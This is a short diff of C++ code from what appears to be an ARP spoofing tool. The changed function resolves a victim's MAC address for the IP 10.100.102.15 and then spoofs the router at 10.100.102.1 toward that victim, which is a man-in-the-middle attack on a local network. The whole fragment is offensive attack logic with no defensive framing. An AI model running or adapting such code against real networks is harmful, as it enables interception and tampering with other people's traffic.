@@ -145,12 +145,12 @@ int arp_main() {
     arp_client.ether_client = &ether_client;
 
 
+    string victim = "10.100.102.15";
     vector<pair<mac_addr, string>> victim_list = {
-            {{0x20, 0x7b, 0xd2, 0xaf, 0xdb, 0xc9}, "10.100.102.15"}
+            {arp_client.search_for_device(victim),victim}
     };
     arp_client.spoof_as_device("10.100.102.1", // router
                                victim_list);
-//    ether_client.spoof();
 
 }
 
